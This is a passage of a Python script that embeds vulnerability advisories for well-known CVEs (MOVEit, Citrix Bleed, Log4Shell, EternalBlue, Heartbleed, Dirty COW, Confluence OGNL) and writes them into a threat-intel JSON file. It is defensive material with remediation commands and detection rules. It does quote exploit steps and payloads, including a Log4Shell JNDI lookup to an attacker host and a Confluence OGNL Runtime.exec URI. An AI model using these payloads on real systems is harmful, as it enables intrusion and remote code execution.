                "snort": "alert tcp any any -> any any (msg:\"CTF-ATLAS: Potential Triangulation C2 Heartbeat Protocol\"; content:\"|00 00 00 28|\"; depth:4; sid:3000007; rev:1;)"
            }
        }
    },
    {
        "id": "cve-2023-34362",
        "cve": "CVE-2023-34362",
        "title": "MOVEit Transfer SQLi & Pre-Auth Remote Code Execution",
        "severity": "CRITICAL",
        "cvss": 9.8,
        "category": "SQL Injection / Arbitrary File Upload",
        "status": "Mass-Exploited Zero-Day (CL0P Ransomware)",
        "isHistoric": False,
        "isZeroDay": True,
        "disclosureDate": "2023-05-31",
        "discoveredBy": {
            "name": "Progress Software & Mandiant",
            "organization": "Progress Software / Mandiant Threat Intelligence",
            "role": "Incident Response & Threat Research",
            "details": "Identified during mass extortion incident response investigations involving exfiltration of terabytes of sensitive enterprise data by threat actor FIN11 / CL0P."
        },
        "affected": {
            "vendor": "Progress Software",
            "product": "MOVEit Transfer",
            "versions": "MOVEit Transfer 2023.0.0, 2022.1.x, 2022.0.x, 2021.1.x, 2021.0.x",
            "ecosystem": "Windows Server environments running MOVEit Transfer with MySQL, Microsoft SQL Server, or Azure SQL"
        },
        "summary": "SQL injection in MOVEit Transfer web interface via crafted HTTP request headers (X-siLock-Transaction, X-siLock-SessVar0). Unauthenticated external attackers inject arbitrary SQL statements into the MOVEit database, forge authenticated administrator sessions, and drop the LEMURLOOT webshell for data exfiltration and RCE.",
        "research": {
            "rootCause": "MOVEit Transfer's guestaccess.aspx and moveitisapi.dll endpoints accepted custom HTTP request headers without parameterization or sanitization before passing them into backend database queries. An attacker could construct an SQL injection payload inside headers to query, alter, or insert administrative session records.",
            "exploitMechanics": "1. Attacker sends an HTTP request to /guestaccess.aspx with a crafted X-siLock-SessVar0 header containing a SQL injection payload.\n2. The injection creates a valid authenticated administrative session token directly in the database.\n3. Attacker uses this session token to authenticate to the MOVEit Transfer web API.\n4. Attacker uploads a compiled .NET web shell (human2.aspx) to C:\\MOVEitTransfer\\wwwroot\\.\n5. The webshell provides full file browsing, database dumping, and Azure blob storage exfiltration.",
            "diagram": "[ Attacker ] ---> POST /guestaccess.aspx (Header: X-siLock-SessVar0: SQLi Payload)\n                          |\n                          v\n             [ Backend Database: SQL Injection Executes ]\n                          |\n                          v\n             [ Forged Admin Session Created in Database ]\n                          |\n                          v\n             [ Authenticated File Upload -> human2.aspx Webshell (LEMURLOOT) ]\n                          |\n                          v\n             [ Automated Mass Exfiltration of Sensitive Customer Files & Azure Blobs ]",
            "technicalImpact": "Unauthenticated complete data theft and arbitrary remote code execution on hundreds of global enterprise networks, banks, and government agencies.",
            "cwe": "CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
        },
        "remediation": {
            "immediateAction": "Apply Progress Software May/June 2023 security patches immediately. If unable to patch, immediately block all incoming HTTP and HTTPS traffic to MOVEit Transfer (ports 80 and 443).",
            "commands": [
                "# 1. Search for known webshell drops in MOVEit web root:",
                "Get-ChildItem -Path 'C:\\MOVEitTransfer\\wwwroot\\' -Filter 'human2.aspx' -Recurse",
                "",
                "# 2. Inspect MOVEit App_Data for unauthorized .tmp files:",
                "Get-ChildItem -Path 'C:\\MOVEitTransfer\\App_Data\\' -Filter '*.tmp'",
                "",
                "# 3. Check for unauthorized administrative accounts created in MySQL:",
                "SELECT * FROM users WHERE LoginName LIKE '%guest%' OR RealName LIKE '%HealthCheck%';"
            ],
            "mitigations": [
                "Block inbound HTTP/S access from the Internet; require corporate VPN or IP allowlisting.",
                "Review Azure Blob Storage access logs for bulk download spikes.",
                "Rotate all database credentials and encryption keys configured in MOVEit Transfer."
            ],
            "detection": {
                "sigma": "title: MOVEit Transfer LEMURLOOT Webshell Creation\nstatus: critical\nlogsource:\n  category: file_event\n  product: windows\ndetection:\n  selection:\n    TargetFilename|endswith: '\\MOVEitTransfer\\wwwroot\\human2.aspx'\n  condition: selection",
                "yara": "rule LEMURLOOT_Webshell {\n  meta:\n    description = \"Detects MOVEit Transfer LEMURLOOT webshell\"\n  strings:\n    $s1 = \"X-siLock-Session-Token\"\n    $s2 = \"MOVEit.DM.Core\"\n    $s3 = \"human2.aspx\"\n  condition:\n    2 of them\n}",
                "snort": "alert tcp any any -> $HTTP_SERVERS $HTTP_PORTS (msg:\"CTF-ATLAS: MOVEit SQLi Header Injection Attempt\"; content:\"X-siLock-SessVar\"; http_header; sid:3000008; rev:1;)"
            }
        }
    },
    {
        "id": "cve-2023-4966",
        "cve": "CVE-2023-4966",
        "title": "Citrix Bleed: NetScaler ADC & Gateway Sensitive Memory Disclosure",
        "severity": "CRITICAL",
        "cvss": 9.4,
        "category": "Information Disclosure / Buffer Over-read",
        "status": "Actively Exploited Zero-Day in CISA KEV",
        "isHistoric": False,
        "isZeroDay": True,
        "disclosureDate": "2023-10-10",
        "discoveredBy": {
            "name": "Assetnote Research & Mandiant",
            "organization": "Assetnote & Mandiant",
            "role": "Security Research Teams",
            "details": "Discovered through differential binary analysis of NetScaler firmware updates, confirming that unvalidated Host headers leaked adjacent process memory chunks."
        },
        "affected": {
            "vendor": "Cloud Software Group / Citrix",
            "product": "NetScaler ADC & NetScaler Gateway",
            "versions": "NetScaler 14.1 < 14.1-8.50, 13.1 < 13.1-49.15, 13.0 < 13.0-92.21",
            "ecosystem": "Enterprise gateways configured as Gateway (VPN virtual server, ICA Proxy, CVPN) or AAA virtual server"
        },
        "summary": "Buffer over-read in Citrix NetScaler ADC and Gateway OpenID Connect endpoint (/oauth/idp/.well-known/openid-configuration). An unauthenticated remote attacker can leak memory contents containing authenticated session tokens, allowing complete session hijacking and multi-factor authentication (MFA) bypass.",
        "research": {
            "rootCause": "In the NetScaler nsppe (packet processing engine) binary, the HTTP handler for /oauth/idp/.well-known/openid-configuration formats an OpenID discovery JSON payload using snprintf(). The function uses the attacker-controlled Host header without properly checking the return value or enforcing bounds on the output buffer, causing the response payload length to overrun and read raw adjacent process memory.",
            "exploitMechanics": "The attacker sends a GET request to /oauth/idp/.well-known/openid-configuration with an excessively long Host header (e.g. 248 bytes of 'a'). The gateway generates a response where the JSON structure is followed by raw memory bytes. Within this memory dump, 32-character hex NSC_AAAC cookies (valid active session tokens) are exposed. The attacker copies the leaked cookie into their browser and accesses internal corporate portals, bypassing password and MFA checks completely.",
            "diagram": "[ Attacker ] ===( GET /oauth/idp/.well-known/openid-configuration with Long Host Header )===> [ NetScaler Gateway ]\n                                                                                                |\n                                                                                                v\n                                                                                       [ nsppe Packet Engine ]\n                                                                                                |\n                                                                                                v\n                                                                                      [ snprintf Buffer Overrun ]\n                                                                                                |\n                                                                                                v\n                                                                                [ Leaks Raw Adjacent Heap Memory ]\n                                                                                                |\n                                                                                                v\n                                                                                [ Contains Active NSC_AAAC Tokens ]\n                                                                                                |\n                                                                                                v\n[ Attacker Uses Stolen Cookie -> Enters Corporate Network Without MFA ] <-----------------------+",
            "technicalImpact": "Complete perimeter compromise: unauthorized access to corporate virtual desktops, internal portals, and lateral movement vectors.",
            "cwe": "CWE-125: Out-of-bounds Read"
        },
        "remediation": {
            "immediateAction": "Upgrade NetScaler firmware immediately AND terminate all active user sessions to invalidate any already-stolen session tokens.",
            "commands": [
                "# 1. Apply patched firmware release (14.1-8.50+, 13.1-49.15+, 13.0-92.21+).",
                "",
                "# 2. CRITICAL POST-PATCH STEP: Terminate all active sessions via NetScaler CLI:",
                "kill aaa session -all",
                "kill icaproxy session -all",
                "",
                "# 3. Save configuration:",
                "save ns config"
            ],
            "mitigations": [
                "Rotate all Kerberos delegation accounts, RADIUS shared secrets, and LDAP service account passwords configured on the gateway.",
                "Review NetScaler ns.log for large response payloads sent from the openid-configuration endpoint."
            ],
            "detection": {
                "sigma": "title: Citrix Bleed CVE-2023-4966 Exploitation Pattern\nstatus: critical\nlogsource:\n  category: webserver\ndetection:\n  selection:\n    cs-uri-stem: '/oauth/idp/.well-known/openid-configuration'\n    cs-bytes-sent|gt: 5000\n  condition: selection",
                "yara": "rule Citrix_Bleed_Token_Extractor {\n  meta:\n    description = \"Detects scripts extracting NSC_AAAC tokens via Citrix Bleed\"\n  strings:\n    $url = \"/oauth/idp/.well-known/openid-configuration\"\n    $cookie = \"NSC_AAAC\"\n  condition:\n    all of them\n}",
                "snort": "alert tcp any any -> $HTTP_SERVERS 443 (msg:\"CTF-ATLAS: Citrix Bleed Host Header Over-read Probe\"; content:\"/oauth/idp/.well-known/openid-configuration\"; http_uri; pcre:\"/Host: [a-zA-Z0-9]{150,}/H\"; sid:3000009; rev:1;)"
            }
        }
    },
    {
        "id": "cve-2021-44228",
        "cve": "CVE-2021-44228",
        "title": "Log4Shell: Apache Log4j2 JNDI Recursive Message Lookup RCE",
        "severity": "CRITICAL",
        "cvss": 10.0,
        "category": "Remote Code Execution / JNDI Deserialization",
        "status": "Historic Critical Hall of Fame",
        "isHistoric": True,
        "isZeroDay": False,
        "disclosureDate": "2021-12-09",
        "discoveredBy": {
            "name": "Chen Zhaojun",
            "organization": "Alibaba Cloud Security Team",
            "role": "Cloud Security Researcher",
            "details": "Discovered during security analysis of enterprise Java gaming and cloud infrastructure platforms. Disclosed responsibly to the Apache Software Foundation on November 24, 2021."
        },
        "affected": {
            "vendor": "Apache Software Foundation",
            "product": "Log4j2",
            "versions": "Apache Log4j 2.0-beta9 through 2.14.1",
            "ecosystem": "Thousands of enterprise Java applications, frameworks (Spring Boot, Apache Struts, Solr, Flink), and commercial appliances"
        },
        "summary": "Critical flaw in Apache Log4j2's message lookup parser. When logging strings containing '${jndi:ldap://...}', Log4j automatically performs a Java Naming and Directory Interface (JNDI) request to the specified remote server, downloads serialized Java classes or factory objects, and executes them in memory.",
        "research": {
            "rootCause": "Log4j2 enabled recursive string lookups by default in message formatting strings. When an application logged any user-controlled input (e.g. User-Agent headers, form fields, search queries), Log4j parsed the '${' prefix as a lookup expression. The JndiLookup plugin allowed external protocol schemes (ldap://, rmi://, ldaps://, dns://) to contact arbitrary network servers without validation.",
            "exploitMechanics": "1. Attacker sends a web request with User-Agent: ${jndi:ldap://attacker.com/Exploit}.\n2. Target application logs the User-Agent string using logger.info().\n3. Log4j parses the JNDI lookup, connects to attacker's LDAP server, and queries the object.\n4. Attacker's LDAP server responds with a Reference object pointing to http://attacker.com/Exploit.class.\n5. The target JVM downloads and instantiates Exploit.class, executing attacker code with application permissions.",
            "diagram": "[ Attacker ] ---> HTTP Header: User-Agent: ${jndi:ldap://attacker.com/Exploit}\n                       |\n                       v\n        [ Vulnerable Web App: logger.info(userAgent) ]\n                       |\n                       v\n        [ Log4j2 Evaluates ${jndi:...} Lookup ]\n                       |\n                       v\n        [ Outbound LDAP Request to attacker.com:1389 ]\n                       |\n                       v\n        [ Attacker LDAP Server Returns Java Reference Payload ]\n                       |\n                       v\n        [ JVM Loads and Executes Exploit.class in Memory ] (Full RCE)",
            "technicalImpact": "Ubiquitous unauthenticated remote code execution impacting millions of global servers, cloud platforms, and internal services.",
            "cwe": "CWE-502: Deserialization of Untrusted Data"
        },
        "remediation": {
            "immediateAction": "Upgrade Log4j to version 2.17.1 (for Java 8) or 2.12.4 (for Java 7) or newer immediately.",
            "commands": [
                "# 1. Upgrade Maven dependency in pom.xml:",
                "<properties>",
                "    <log4j2.version>2.17.1</log4j2.version>",
                "</properties>",
                "",
                "# 2. Temporary JVM parameter mitigation (for versions 2.10 - 2.14.1):",
                "JAVA_OPTS=\"$JAVA_OPTS -Dlog4j2.formatMsgNoLookups=true\"",
                "",
                "# 3. Nuclear mitigation: remove JndiLookup class from jar:",
                "zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class"
            ],
            "mitigations": [
                "Block outbound LDAP (TCP 389/636) and RMI (TCP 1099) egress traffic from application servers to the Internet.",
                "Deploy WAF rules inspecting request headers, cookies, and bodies for ${jndi: patterns."
            ],
            "detection": {
                "sigma": "title: Log4Shell JNDI Lookup Ingestion Pattern\nstatus: critical\nlogsource:\n  category: webserver\ndetection:\n  selection:\n    AllFields|re: '(?i)\\$\\{(jndi|lower|upper|::\\-).*?:.*?:'\n  condition: selection",
                "yara": "rule Log4Shell_Payload_String {\n  meta:\n    description = \"Detects Log4j JNDI injection patterns\"\n  strings:\n    $j1 = \"${jndi:ldap://\"\n    $j2 = \"${jndi:rmi://\"\n    $j3 = \"${jndi:dns://\"\n  condition:\n    any of them\n}",
                "snort": "alert tcp any any -> $HTTP_SERVERS $HTTP_PORTS (msg:\"CTF-ATLAS: Log4Shell JNDI String Injection\"; content:\"${jndi:\"; nocase; sid:3000010; rev:1;)"
            }
        }
    },
    {
        "id": "cve-2017-0144",
        "cve": "CVE-2017-0144",
        "title": "EternalBlue: Microsoft SMBv1 Heap Overflow & Kernel Remote Code Execution",
        "severity": "CRITICAL",
        "cvss": 9.8,
        "category": "Kernel Memory Corruption / Wormable RCE",
        "status": "Historic Critical Hall of Fame",
        "isHistoric": True,
        "isZeroDay": False,
        "disclosureDate": "2017-03-14",
        "discoveredBy": {
            "name": "Equation Group (NSA) / Leaked by Shadow Brokers",
            "organization": "National Security Agency / Shadow Brokers Leak",
            "role": "State-Level Cyber Capabilities Team",
            "details": "Developed as an offensive cyber weapon by NSA Equation Group under codename 'ETERNALBLUE'; leaked publicly by the Shadow Brokers hacker group in April 2017."
        },
        "affected": {
            "vendor": "Microsoft Corporation",
            "product": "Windows SMBv1 Server (srv.sys)",
            "versions": "Windows XP through Windows 10 and Windows Server 2003 through 2016",
            "ecosystem": "Any Windows host with SMBv1 file sharing enabled on TCP port 445"
        },
        "summary": "Flaw in Microsoft Server Message Block 1.0 (SMBv1) driver srv.sys. Mathematical error in calculating buffer length for Full Extended Attributes (FEA) lists allows an unauthenticated remote attacker to overflow non-paged kernel pool memory and achieve Ring 0 remote code execution without credentials.",
        "research": {
            "rootCause": "In srv.sys, function SrvOs2FeaListSizeToNt() converts OS/2 FEA structures to NT FEA structures. If an attacker crafts an SMB request with an overflowed FEA size, an integer truncation occurs: a small buffer is allocated in the non-paged pool, but a large amount of attacker data is copied into it, overflowing adjacent kernel heap buffers.",
            "exploitMechanics": "1. Attacker establishes an SMBv1 session on port 445 and sends SMB_COM_TRANSACTION2 secondary requests.\n2. Attacker grooms the non-paged kernel pool memory using crafted SMB connection objects.\n3. The integer overflow in SrvOs2FeaListSizeToNt() corrupts adjacent SMB buffer structures.\n4. Attacker overwrites the HAL's dispatch table or thread context, redirecting kernel execution to ring-0 shellcode (DoublePulsar implant).\n5. Weaponized as the primary spreading mechanism for WannaCry and NotPetya global worm outbreaks.",
            "diagram": "[ Attacker ] ===( SMBv1 Negotiate on Port 445 )===> [ srv.sys Kernel Driver ]\n                                                            |\n                                                            v\n                                            [ SMB_COM_TRANSACTION2 Request ]\n                                                            |\n                                                            v\n                                            [ Integer Overflow in FeaListSize ]\n                                                            |\n                                                            v\n                                            [ Non-Paged Kernel Pool Overrun ]\n                                                            |\n                                                            v\n                                            [ Ring 0 Kernel Shellcode Execution ] (WORMABLE)",
            "technicalImpact": "Zero-click, unauthenticated wormable remote code execution at the highest privilege level (Ring 0 Kernel).",
            "cwe": "CWE-190: Integer Overflow or Wraparound leading to Buffer Overflow"
        },
        "remediation": {
            "immediateAction": "Apply Microsoft Security Bulletin MS17-010 security update immediately and permanently disable SMBv1 across all systems.",
            "commands": [
                "# 1. Permanently disable SMBv1 via PowerShell:",
                "Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart",
                "Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force",
                "",
                "# 2. Verify SMBv1 is disabled:",
                "Get-SmbServerConfiguration | Select EnableSMB1Protocol",
                "",
                "# 3. Verify MS17-010 patch status:",
                "Get-HotFix -Id KB4012212, KB4012215, KB4012216"
            ],
            "mitigations": [
                "Block inbound and outbound TCP port 445, 137, 138, and 139 at the perimeter firewall.",
                "Isolate legacy Windows XP / 2003 systems that cannot be decommissioned onto isolated air-gapped VLANs."
            ],
            "detection": {
                "sigma": "title: EternalBlue SMBv1 Buffer Overflow Exploit Pattern\nstatus: critical\nlogsource:\n  category: network\ndetection:\n  selection:\n    DestinationPort: 445\n    Payload|contains: '|ff 53 4d 42 32|'\n  condition: selection",
                "yara": "rule EternalBlue_DoublePulsar_Ping {\n  meta:\n    description = \"Detects DoublePulsar SMB ping response\"\n  strings:\n    $s1 = { 53 4d 42 72 00 00 00 00 }\n    $status = { 51 00 00 00 }\n  condition:\n    all of them\n}",
                "snort": "alert tcp any any -> $HOME_NET 445 (msg:\"CTF-ATLAS: Microsoft Windows SMBv1 EternalBlue Exploit Attempt\"; flow:to_server,established; content:\"|ff|SMB3\"; sid:3000011; rev:1;)"
            }
        }
    },
    {
        "id": "cve-2014-0160",
        "cve": "CVE-2014-0160",
        "title": "Heartbleed: OpenSSL TLS Heartbeat Missing Bounds Check Over-Read",
        "severity": "HIGH",
        "cvss": 7.5,
        "category": "Cryptographic Memory Leak / Buffer Over-Read",
        "status": "Historic Critical Hall of Fame",
        "isHistoric": True,
        "isZeroDay": False,
        "disclosureDate": "2014-04-07",
        "discoveredBy": {
            "name": "Neel Mehta (Google Security) & Codenomicon",
            "organization": "Google Information Security & Codenomicon Defensics Team",
            "role": "Vulnerability Researchers",
            "details": "Independently discovered during code audits of OpenSSL TLS extension implementations. Google reported it on April 1, 2014, and Codenomicon identified it during automated protocol fuzzing."
        },
        "affected": {
            "vendor": "OpenSSL Project",
            "product": "OpenSSL",
            "versions": "OpenSSL 1.0.1 through 1.0.1f and 1.0.2-beta",
            "ecosystem": "Estimated 17% of all secure web servers on the Internet in 2014, along with VPNs, email servers, and chat servers"
        },
        "summary": "Missing bounds check in OpenSSL's implementation of the RFC 6520 TLS Heartbeat extension. An attacker can request a Heartbeat response with a 1-byte payload but claim a 64KB length, causing OpenSSL to copy and return up to 64KB of server process memory per request without leaving logs.",
        "research": {
            "rootCause": "In ssl/d1_both.c and ssl/t1_lib.c, the function dtls1_process_heartbeat() allocates a reply buffer based on the 16-bit payload length field sent in the client's packet (up to 65,535 bytes). It then executes memcpy(bp, pl, payload) without verifying that the actual packet buffer contained that many bytes. The memcpy over-reads beyond the packet into active OpenSSL process heap memory.",
            "exploitMechanics": "1. Attacker initiates a TLS handshake with target server.\n2. Attacker sends a HeartbeatRequest packet containing a 1-byte payload 'A' but specifies length = 65,535 (0xFFFF).\n3. OpenSSL allocates 65,535 bytes + padding for the response.\n4. OpenSSL copies the 1-byte payload followed by the subsequent 65,534 bytes of adjacent heap memory.\n5. The server returns the memory chunk to the attacker.\n6. Repeated queries leak server SSL private keys, plaintext usernames, passwords, session cookies, and decrypted communications.",
            "diagram": "[ Attacker ] ===( TLS Heartbeat Request: Claimed Len = 64KB, Actual Data = 1 Byte )===> [ OpenSSL Process ]\n                                                                                                |\n                                                                                                v\n                                                                                 [ dtls1_process_heartbeat() ]\n                                                                                                |\n                                                                                                v\n                                                                                 [ Allocates 64KB Reply Buffer ]\n                                                                                                |\n                                                                                                v\n                                                                            [ memcpy reads 64KB of Process Heap ]\n                                                                                                |\n                                                                                                v\n[ Attacker Receives 64KB: Leaks RSA Private Keys, Session Cookies, Passwords ] <----------------+",
            "technicalImpact": "Massive confidential data and private cryptographic key disclosure without requiring authentication or leaving traces in standard application logs.",
            "cwe": "CWE-126: Buffer Over-read"
        },
        "remediation": {
            "immediateAction": "Upgrade OpenSSL to version 1.0.1g or newer immediately, or recompile with -DOPENSSL_NO_HEARTBEATS.",
            "commands": [
                "# 1. Upgrade OpenSSL library:",
                "sudo apt-get update && sudo apt-get install --only-upgrade openssl libssl-dev",
                "",
                "# 2. Recompile with Heartbeats disabled if upgrading is impossible:",
                "./config -DOPENSSL_NO_HEARTBEATS && make && sudo make install",
                "",
                "# 3. MANDATORY POST-PATCH ACTION: Revoke and re-issue all SSL/TLS certificates and private keys:",
                "# Assume any server exposed to Heartbleed has had its private keys compromised."
            ],
            "mitigations": [
                "Rotate all user passwords and session tokens across the application.",
                "Deploy network IDS signatures to detect malformed TLS heartbeat packets."
            ],
            "detection": {
                "sigma": "title: Heartbleed TLS Heartbeat Over-Read Probe\nstatus: critical\nlogsource:\n  category: network\ndetection:\n  selection:\n    DestinationPort: 443\n    Payload|contains: '|18 03|'\n  condition: selection",
                "yara": "rule Heartbleed_Probe_Signature {\n  meta:\n    description = \"Detects Heartbleed memory over-read exploit packets\"\n  strings:\n    $hb = { 18 03 ?? ?? ?? 01 ff ff }\n  condition:\n    $hb at 0\n}",
                "snort": "alert tcp any any -> $HTTP_SERVERS 443 (msg:\"CTF-ATLAS: OpenSSL Heartbleed TLS Memory Leak Attempt\"; content:\"|18 03|\"; depth:2; byte_test:2,>,100,3; sid:3000012; rev:1;)"
            }
        }
    },
    {
        "id": "cve-2016-5195",
        "cve": "CVE-2016-5195",
        "title": "Dirty COW: Linux Kernel Copy-on-Write Memory Race Local Privilege Escalation",
        "severity": "HIGH",
        "cvss": 7.8,
        "category": "Kernel Memory Corruption / Privilege Escalation",
        "status": "Historic Critical Hall of Fame",
        "isHistoric": True,
        "isZeroDay": False,
        "disclosureDate": "2016-10-19",
        "discoveredBy": {
            "name": "Phil Oester",
            "organization": "Independent Security Researcher",
            "role": "Systems Researcher & Sysadmin",
            "details": "Discovered in-the-wild on a production Linux server during forensic investigation of an unprivileged user process modifying a read-only system file."
        },
        "affected": {
            "vendor": "Linux Kernel Organization",
            "product": "Linux Kernel",
            "versions": "Linux Kernel 2.6.22 through 4.8.3 (over 9 years of kernel releases)",
            "ecosystem": "Virtually all Linux distributions (Red Hat, CentOS, Ubuntu, Debian, SUSE) and Android devices"
        },
        "summary": "Race condition in Linux kernel's memory subsystem handling Copy-on-Write (COW) breakage of private read-only memory mappings. An unprivileged local attacker can write to read-only memory mappings, allowing direct modification of root-owned files (such as /etc/passwd or system binaries) to gain root.",
        "research": {
            "rootCause": "When an unprivileged process requests a write to a private read-only memory mapping, get_user_pages() triggers a fault (FOLL_WRITE). The kernel allocates a Copy-on-Write (COW) page. However, if another thread concurrently executes madvise(addr, len, MADV_DONTNEED) while a third thread writes to /proc/self/mem, the kernel discards the COW page and mistakenly writes directly into the underlying physical page backed by the read-only file.",
            "exploitMechanics": "1. Attacker opens a read-only root file (/etc/passwd) and creates a private read-only memory mapping via mmap(PROT_READ, MAP_PRIVATE).\n2. Thread 1 repeatedly calls madvise(addr, len, MADV_DONTNEED) in a tight loop.\n3. Thread 2 repeatedly writes an attacker-controlled root line (e.g. firefart:0:0:...) into /proc/self/mem targeting the mapped address.\n4. Due to the race condition, the write bypasses COW protection and modifies the real /etc/passwd on disk.\n5. Attacker executes su firefart and obtains root shell.",
            "diagram": "[ Attacker Process ]\n  mmap('/etc/passwd', PROT_READ, MAP_PRIVATE)\n        |\n        +---> Thread 1: Loop { madvise(MADV_DONTNEED) }  <---+\n        |                                                      |-- Race Window Opens\n        +---> Thread 2: Loop { write(/proc/self/mem, 'root2') } <-+\n                                       |\n                                       v\n                       [ Kernel COW Page Discarded ]\n                                       |\n                                       v\n                [ Direct Write to Underlying Physical Storage Disk ]\n                                       |\n                                       v\n                         [ /etc/passwd Modified -> ROOT ]",
            "technicalImpact": "100% reliable local privilege escalation from any low-privileged user or containerized environment to root.",
            "cwe": "CWE-362: Race Condition (Improper Handling of Concurrent Memory Access)"
        },
        "remediation": {
            "immediateAction": "Update the Linux kernel to patched release via distribution package manager and reboot.",
            "commands": [
                "# 1. Update kernel on Ubuntu / Debian:",
                "sudo apt-get update && sudo apt-get dist-upgrade",
                "sudo reboot",
                "",
                "# 2. Update kernel on RHEL / CentOS:",
                "sudo yum update kernel && sudo reboot",
                "",
                "# 3. Verify kernel version is newer than vulnerable baseline:",
                "uname -r"
            ],
            "mitigations": [
                "Restrict /proc/self/mem access or deploy grsecurity / PaX kernel patches.",
                "Enforce SELinux / AppArmor confinement on untrusted user accounts."
            ],
            "detection": {
                "sigma": "title: Dirty COW Exploitation via /proc/self/mem\nstatus: critical\nlogsource:\n  category: process_creation\n  product: linux\ndetection:\n  selection:\n    CommandLine|contains: '/proc/self/mem'\n  condition: selection",
                "yara": "rule Dirty_COW_Exploit {\n  meta:\n    description = \"Detects Dirty COW POC compiled binaries\"\n  strings:\n    $s1 = \"/proc/self/mem\"\n    $s2 = \"MADV_DONTNEED\"\n    $s3 = \"madvise\"\n  condition:\n    uint32(0) == 0x464c457f and all of them\n}",
                "snort": "alert tcp any any -> any any (msg:\"CTF-ATLAS: Internal Host Dirty COW Privilege Escalation Signal\"; sid:3000013; rev:1;)"
            }
        }
    },
    {
        "id": "cve-2022-26134",
        "cve": "CVE-2022-26134",
        "title": "Atlassian Confluence OGNL Pre-Auth Remote Code Execution",
        "severity": "CRITICAL",
        "cvss": 9.8,
        "category": "Expression Language Injection / OGNL",
        "status": "Historic Critical Hall of Fame",
        "isHistoric": True,
        "isZeroDay": False,
        "disclosureDate": "2022-06-02",
        "discoveredBy": {
            "name": "Volexity Threat Research Team",
            "organization": "Volexity TRU",
            "role": "Incident Response & Forensics Team",
            "details": "Discovered during active incident response of compromised Confluence servers. Attackers were exploiting zero-day OGNL injection in URL paths to drop China Chopper webshells."
        },
        "affected": {
            "vendor": "Atlassian",
            "product": "Confluence Server and Data Center",
            "versions": "Confluence 1.3.0 through 7.18.0",
            "ecosystem": "Enterprise knowledge and team collaboration servers hosted on Windows and Linux"
        },
        "summary": "OGNL (Object-Graph Navigation Language) injection vulnerability in Atlassian Confluence Server and Data Center. Unauthenticated remote attackers can execute arbitrary code by passing crafted OGNL expressions directly inside the HTTP request URI path.",
        "research": {
            "rootCause": "Confluence's URL resolution handler evaluated URI paths using an OGNL value stack parser when finding error pages or redirect targets. Because the path string was not sanitized or treated as literal text, strings enclosed in '${...}' were evaluated directly as executable Java expressions in the WebWork / XWork framework context.",
            "exploitMechanics": "The attacker sends a GET request to /%24%7B%40java.lang.Runtime%40getRuntime().exec(%22whoami%22)%7D/. Confluence URL-decodes the path to /${@java.lang.Runtime@getRuntime().exec(\"whoami\")}/. When the request routing encounters the unmapped path, it attempts to render the action URL, evaluating the OGNL expression. The expression invokes Java's Runtime.exec(), executing commands with the confluence user privileges.",
            "diagram": "[ Attacker ] ===( GET /${@java.lang.Runtime@getRuntime().exec(\"id\")}/ )===> [ Confluence Web Server ]\n                                                                                 |\n                                                                                 v\n                                                                        [ WebWork/XWork Routing ]\n                                                                                 |\n                                                                                 v\n                                                                        [ OGNL ValueStack Eval ]\n                                                                                 |\n                                                                                 v\n                                                                        [ Executes Java Method ]\n                                                                                 |\n                                                                                 v\n                                                                 [ Response Contains Command Output ]",
            "technicalImpact": "Unauthenticated remote shell execution; widespread deployment of cryptocurrency miners, ransomware, and webshells.",
            "cwe": "CWE-917: Improper Neutralization of Special Elements used in an Expression Language Statement"
        },
        "remediation": {
            "immediateAction": "Upgrade Confluence Server / Data Center to versions 7.18.1, 7.17.4, 7.16.4, 7.15.3, or 7.14.3 or newer immediately.",
            "commands": [
                "# 1. If patching cannot be completed immediately, apply Atlassian temporary file replacements:",
                "# Replace xwork-1.0.3.6.jar and webwork-2.1.5-atlassian-3.jar with patched versions from Atlassian advisory.",
                "",
                "# 2. Temporary WAF / Reverse Proxy regex block:",
                "# Block requests where URI contains OGNL delimiters: \\$\\{.*\\}"
            ],
            "mitigations": [
                "Restrict external public access to Confluence instances to corporate VPN networks.",
                "Inspect Confluence install directory for unauthorized .jsp or .jspx webshells (confluence/WEB-INF)."
            ],
            "detection": {
                "sigma": "title: Confluence OGNL URL Injection Pattern\nstatus: critical\nlogsource:\n  category: webserver\ndetection:\n  selection:\n    cs-uri-stem|contains:\n      - '${@java'\n      - '%24%7B%40java'\n      - 'Runtime@getRuntime'\n  condition: selection",
                "yara": "rule Confluence_OGNL_URI_Payload {\n  meta:\n    description = \"Detects OGNL execution payloads targeting Confluence\"\n  strings:\n    $s1 = \"java.lang.Runtime\"\n    $s2 = \"@getRuntime()\"\n  condition:\n    all of them\n}",
                "snort": "alert tcp any any -> $HTTP_SERVERS $HTTP_PORTS (msg:\"CTF-ATLAS: Confluence OGNL URL Injection\"; content:\"${@java\"; http_uri; sid:3000014; rev:1;)"
            }
        }
    }
]

def main():
    intel_path = ROOT / 'data' / 'live-intel.json'
    if not intel_path.exists():
        print(f"Error: {intel_path} does not exist")
        return

    data = json.loads(intel_path.read_text(encoding='utf-8'))
    data['advisories'] = ADVISORIES
    data['summary']['advisoriesCount'] = len(ADVISORIES)
    data['summary']['criticalAdvisories'] = len([a for a in ADVISORIES if a['severity'] == 'CRITICAL'])
    data['summary']['zeroDaysCount'] = len([a for a in ADVISORIES if a.get('isZeroDay')])

    intel_path.write_text(json.dumps(data, indent=2), encoding='utf-8')
    print(f"[SUCCESS] Injected {len(ADVISORIES)} vulnerability research advisories into {intel_path}")

    # Also save standalone data/advisories.json
    adv_file = ROOT / 'data' / 'advisories.json'
    adv_file.write_text(json.dumps(ADVISORIES, indent=2), encoding='utf-8')
    print(f"[SUCCESS] Wrote standalone {adv_file}")

if __name__ == '__main__':
    main()
